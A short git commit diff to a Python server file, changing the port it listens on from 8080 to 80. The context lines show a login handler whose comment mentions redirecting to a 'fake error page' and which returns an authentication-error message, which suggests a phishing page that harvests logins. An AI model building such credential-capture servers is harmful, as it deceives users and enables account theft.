bf518fbee1052742845f33ce3792fefeba3f468a
BrDenky <mateopilaquinga@gmail.com>
2025-11-20 02:10:06 -0500

    server

--- server.py
+++ server.py
@@ -18,4 +18,5 @@ def login():
     # Opcional: redirigir a una página falsa de error
     return "<h3>Error de autenticación. Intente nuevamente.</h3>"
 
-app.run(host="0.0.0.0", port=8080)
+app.run(host="0.0.0.0", port=80)
+
